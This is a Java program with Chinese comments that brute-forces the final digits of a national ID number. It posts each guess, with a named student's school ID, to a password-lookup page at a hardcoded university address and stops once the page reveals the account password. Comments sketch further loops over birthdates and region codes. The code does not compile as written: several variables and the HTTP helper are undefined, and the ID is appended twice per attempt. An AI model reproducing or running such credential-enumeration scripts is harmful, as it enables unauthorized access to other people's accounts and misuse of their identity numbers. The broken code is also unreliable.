package src.com.venk.plan.ufpasspos;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class doPass {

	public static void main(String[] args) throws UnsupportedEncodingException {

		final String name = "lalala";
		final String schoolId = "120529xxxx";
		StringBuffer idNumBuf = new StringBuffer();
		int personI = 0;
		idNumBuf.append(localNum).append(BirthDay).append("0000");
		// 身份证号清空
		// idNumBuf.replace(0,idNumBuf.length()-1,"");
		String idNum = "";
		
		// 下面的代码不需要更改
		final String url = "http://218.195.32.11/(pmtpo355krszuk551rtvejb4)/mmcx.aspx";
		final String whatTheHeHe = "__VIEWSTATE=dDwxODY3NzcwMTYwO3Q8O2w8aTwxPjs%2BO2w8d"
				+ "Dw7bDxpPDE1PjtpPDE3Pjs%2BO2w8dDxwPDtwPGw8b25jbGljazs%2BO2w8cmV0dXJuI"
				+ "ENoZWNrSW5wdXQoKVw7Oz4%2BPjs7Pjt0PHA8bDxWaXNpYmxlOz47bDxvPGY%2BOz4%2"
				+ "BOzs%2BOz4%2BOz4%2BOz4TDCMSzWeeL1b9NqMfmU4TIhxIwg%3D%3D";
		final String ddlUserType = "%D1%A7%C9%FA";
		final String btSearch = "+%B2%E9+%D1%AF+";
		final String encodeName = java.net.URLEncoder.encode(name, "GB2312");

		/*
		 * 身份证号生成模块
		 */

		/*
		 * 地区模块 (数组)
		 */

		/*
		 * 生日日期模块 (最小值，最大值) int i = 1993; a.append("a").append(i); //
		 * System.out.println(a);
		 */

		  //请求模块    sr是否可使用StringBuilder拼接
		  for (int i = 300; i <= 1000; i ++){
			  String str = String.format("%04d", i);
			  idNumBuf.replace(0 ,idNumBuf.length() , "");
			  idNumBuf.append(localNum).append(BirthDay).append(str);
			  idNumBuf.append(localNum).append(BirthDay).append(str).append("x");
			  
		  String sr = HttpRequest.sendPost(
		  url,whatTheHeHe
		  + "&txtIdNo=" + schoolId + 
		  "&txtName=" + encodeName +
		  "&txtIdentityNo=" + idNumBuf 	//idNum
		  +"&ddlUserType=" + ddlUserType 
		  +"&btSearch=" + btSearch); 
		  	  
		  if(sr.contains("lblPwd")){
			  //System.out.println(i);
			  System.out.println("haha");
			  System.out.println(sr); 
			  break;
		  }else{
			  System.out.println(idNumBuf);
			  
		  }
		  }
		 

		// System.out.println(sr.contains("lblPwd"));

		/*
		 * 匹配模块
		 */
		// 正则表达式查找html中对应条件字符串

		/*
		 * Matcher matcher = pattern.matcher("<a href=/"index.html/">主页</a>");
		 * if(matcher.find()) System.out.println(matcher.group(1));
		 */

		/*
		 * 日期遍历模块 // 请注意月份是从0-11 final int startYear = 1993; final int
		 * startMonth = 10; final int startDay = 27;
		 * 
		 * final int endYear = 1993; final int endMonth = 11; final int endDay =
		 * 25;
		 * 
		 * Calendar start = Calendar.getInstance(); start.set(startYear,
		 * startMonth - 1, startDay); Calendar end = Calendar.getInstance();
		 * end.set(endYear, endMonth - 1, endDay);
		 * 
		 * SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd"); while
		 * (start.compareTo(end) <= 0) { // 打印每天
		 * System.out.println(format.format(start.getTime())); // 循环，每次天数加1
		 * start.set(Calendar.DATE, start.get(Calendar.DATE) + 1); } }
		 */
	}
}

